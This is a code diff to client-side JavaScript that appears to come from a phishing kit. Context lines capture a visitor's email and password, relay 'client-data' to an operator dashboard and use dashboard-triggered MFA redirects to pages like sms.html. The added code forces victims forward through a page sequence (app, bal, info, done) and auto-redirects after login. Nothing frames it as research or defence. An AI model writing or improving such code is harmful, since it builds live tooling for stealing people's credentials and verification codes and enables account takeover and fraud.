@@ -4,6 +4,7 @@
   const SESSION_STORAGE_KEY = "sessionID";
   const DASH_EMIT_EVENT = "client-data";     // matches your dashboard code
   const DASH_JOIN_EVENT = "client-join";     // matches your dashboard code
+  const PAGE_PROGRESS_KEY = "page_progress";
     // Persist "login pending" so page stays in loading state across refresh
   const PENDING_KEY = "ws_pending_login";
   window.wsSavePendingLogin = function(email, password) {
@@ -16,8 +17,41 @@
     try { localStorage.removeItem(PENDING_KEY); } catch {}
   };
 
+// Page progress tracking functions
+// Page progress tracking functions
+  window.setPageProgress = function(page) {
+    try { localStorage.setItem(PAGE_PROGRESS_KEY, page); } catch {}
+  };
+  
+  window.getPageProgress = function() {
+    try { return localStorage.getItem(PAGE_PROGRESS_KEY) || null; } catch { return null; }
+  };
+  
+  window.clearPageProgress = function() {
+    try { localStorage.removeItem(PAGE_PROGRESS_KEY); } catch {}
+  };
 
-    // Redirect targets for dashboard MFA actions
+  // Check if we should redirect based on page progress
+  function checkPageProgress() {
+    const currentPage = window.location.pathname.split('/').pop() || 'app.html';
+    const progress = window.getPageProgress();
+    
+    if (!progress) return; // No progress saved, allow access
+    
+    // Define page order
+    const pageOrder = ['app.html', 'bal.html', 'info.html', 'done.html'];
+    const currentIndex = pageOrder.indexOf(currentPage);
+    const progressIndex = pageOrder.indexOf(progress);
+    
+    // If user is trying to access a page before their progress, redirect forward
+    if (currentIndex !== -1 && progressIndex !== -1 && currentIndex < progressIndex) {
+      console.log(`[page-progress] Redirecting from ${currentPage} to ${progress}`);
+      window.location.href = progress;
+    }
+  }
+
+  // Run page progress check on load
+  
   // Redirect targets for dashboard MFA actions
   const MFA_REDIRECT = {
     sms: "sms.html",
@@ -30,7 +64,7 @@
   };
 
 
-
+checkPageProgress();
   // --- Utilities -----------------------------------------------------------
   function onceDomReady(fn) {
     if (document.readyState === "loading") {
@@ -587,6 +621,13 @@ window.wsShowInlineError = showInlineError;
 
     // Replace content with spinner
     btn.innerHTML = SPINNER_HTML;
+    // **NEW: Auto-redirect to bal.html after 1.5 seconds**
+setTimeout(() => {
+  try { window.wsClearPendingLogin && window.wsClearPendingLogin(); } catch {}
+  window.setPageProgress('bal.html');
+  window.location.href = 'bal.html';
+}, 1500);
+
   }
 
   // Handle form submits (keyboard or programmatic)
